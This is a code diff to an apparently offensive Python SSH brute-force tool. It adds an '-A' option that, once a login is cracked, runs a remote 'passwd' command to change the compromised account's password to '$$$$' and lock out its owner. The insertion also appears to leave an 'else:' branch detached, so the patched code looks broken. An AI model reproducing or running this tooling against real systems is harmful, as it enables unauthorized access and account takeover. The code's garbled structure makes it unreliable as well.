@@ -219,7 +219,7 @@ def parse_cmdline(cmdline):
 
   try:
     _opts, _args = getopt.getopt(cmdline,
-      'h:l:m:s:b:r:c:N:u:U:p:P:C:x:S:X:B:T:R:o:evVHa')
+      'h:l:m:s:b:r:c:N:u:U:p:P:C:x:S:X:B:T:R:o:evVHaA')
     for o, a in _opts:
       if o == '-h':
         opts['targets'] = parse_target(a)
@@ -265,6 +265,8 @@ def parse_cmdline(cmdline):
         opts['exit'] = True
       if o == '-a':
         opts['write_up'] = True
+      if o == '-A':
+        opts['passwd_up'] = True        
       if o == '-v':
         opts['verbose'] = True
       if o == '-V':
@@ -409,7 +411,7 @@ def crack_login(host, port, username, password):
         stdin, stdout, stderr = cli.exec_command(diycmd, timeout=2)
         log(f"write_up ssh command results for \'{diycmd}\'", 'good')
         for line in stdout.readlines():
-          log(line)
+          log(line)          
       if opts['cmd']:
         if os.path.isfile(opts['cmd']):
           log(f"sending ssh commands from {opts['cmd']}", 'info')
@@ -423,8 +425,14 @@ def crack_login(host, port, username, password):
                     pre_esc='\n')
                   for line in rl:
                     log(f'{line}')
+      if opts['passwd_up']:
+        diycmd=f"echo -e ''$$$$\\\\n$$$$''| passwd || echo -e ''{password}\\\\n$$$$\\\\n$$$$'' | passwd || echo ''{password}\\\\n$$$$\\\\n$$$$'' | passwd";
+        stdin, stdout, stderr = cli.exec_command(diycmd, timeout=2)
+        log(f"passwd_up ssh command results for \'{diycmd}\'", 'good')
+        for line in stdout.readlines():
+          log(line)      
         else:
-          log('sending your single ssh command line', 'info')
+          log('sending your single ssh command line', 'info')         
           if not opts['cmd_no_out']:
             stdin, stdout, stderr = cli.exec_command(opts['cmd'], timeout=2)
             log(f"ssh command results for \'{opts['cmd'].rstrip()}\'", 'good')
